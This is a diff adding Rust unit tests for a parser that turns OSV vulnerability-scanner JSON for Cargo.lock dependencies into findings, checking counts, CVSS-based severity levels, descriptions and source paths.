+    fn osv_parse_low_severity() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "Cargo.lock", "type": "lockfile"},
+                "packages": [{
+                    "package": {
+                        "name": "some-crate",
+                        "version": "1.0.0",
+                        "ecosystem": "crates.io"
+                    },
+                    "vulnerabilities": [{
+                        "id": "RUSTSEC-2023-0001",
+                        "summary": "Minor information leak",
+                        "aliases": [],
+                        "severity": [{"type": "CVSS_V3", "score": "2.5"}]
+                    }]
+                }]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings.len(), 1);
+        assert!(has_severity(&findings, "Low"));
+    }
+
+    #[test]
+    fn osv_parse_no_score_defaults_medium() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "Cargo.lock", "type": "lockfile"},
+                "packages": [{
+                    "package": {
+                        "name": "mystery-crate",
+                        "version": "0.1.0",
+                        "ecosystem": "crates.io"
+                    },
+                    "vulnerabilities": [{
+                        "id": "RUSTSEC-2024-0099",
+                        "summary": "Unspecified vulnerability",
+                        "aliases": []
+                    }]
+                }]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings.len(), 1);
+        // Default score 5.0 => Medium
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn osv_parse_multiple_packages_and_vulns() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "Cargo.lock", "type": "lockfile"},
+                "packages": [
+                    {
+                        "package": {"name": "crate-a", "version": "1.0.0", "ecosystem": "crates.io"},
+                        "vulnerabilities": [
+                            {"id": "GHSA-1111", "summary": "Vuln A1", "aliases": [], "severity": [{"type": "CVSS_V3", "score": "9.0"}]},
+                            {"id": "GHSA-2222", "summary": "Vuln A2", "aliases": [], "severity": [{"type": "CVSS_V3", "score": "5.0"}]}
+                        ]
+                    },
+                    {
+                        "package": {"name": "crate-b", "version": "2.0.0", "ecosystem": "crates.io"},
+                        "vulnerabilities": [
+                            {"id": "GHSA-3333", "summary": "Vuln B1", "aliases": ["CVE-2024-0001"], "severity": [{"type": "CVSS_V3", "score": "7.5"}]}
+                        ]
+                    }
+                ]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings.len(), 3);
+        assert!(has_description_containing(&findings, "crate-a"));
+        assert!(has_description_containing(&findings, "crate-b"));
+        assert!(has_severity(&findings, "Critical")); // 9.0
+        assert!(has_severity(&findings, "High"));     // 7.5
+        assert!(has_severity(&findings, "Medium"));   // 5.0
+    }
+
+    #[test]
+    fn osv_parse_source_path_is_preserved() {
+        let json = r#"{
+            "results": [{
+                "source": {"path": "/home/user/project/Cargo.lock", "type": "lockfile"},
+                "packages": [{
+                    "package": {"name": "foo", "version": "1.0.0", "ecosystem": "crates.io"},
+                    "vulnerabilities": [{
+                        "id": "GHSA-test",
+                        "summary": "Test vuln",
+                        "aliases": []
+                    }]
+                }]
+            }]
+        }"#;
+        let findings = parse_osv_json(json);
+        assert_eq!(findings[0].file, "/home/user/project/Cargo.lock");
     }
 }
